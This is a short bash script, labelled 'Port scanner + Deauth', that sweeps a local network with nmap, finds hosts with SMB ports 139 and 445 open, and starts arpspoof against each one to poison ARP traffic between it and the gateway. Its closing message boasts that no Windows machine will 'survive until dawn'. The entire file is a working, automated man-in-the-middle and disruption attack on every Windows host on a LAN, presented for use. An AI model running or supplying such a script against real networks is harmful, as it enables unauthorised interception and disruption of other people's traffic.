#! /bin/bash

###Port scanner + Deauth###

NETWORK="192.168.0.0/24"
IFACE="eth0"
TIME=15
GATEWAY=$(ip route | grep default | awk '{print$3}')

echo -e "\033[1;38;5;141m$(curl -s https://raw.githubusercontent.com/REZONAZERO/BashScripts/main/banners/silver_wolfs_revenge.txt)\033[0m"

read -p "Scan Network?(Y/n): " confirm && [[ $confirm == [yY] ]] || exit 1

nmap -sn $NETWORK -oG active_hosts.txt
grep "Up" active_hosts.txt | awk '{print $2}' > active_ips.txt

while read ip; do
	if [ "$ip" == "$GATEWAY" ]; then
		continue
	fi
	if nmap -p 139,445 $ip | grep -q "open"; then
		echo "[+]Target found: $ip"
		arpspoof -i $IFACE -t $ip -r $GATEWAY >/dev/null 2>&1 &
		echo $! >> pids.txt
	fi
done < active_ips.txt
echo "[*] No one Windows will survive until dawn, ill poison as much packets as i can [*]"


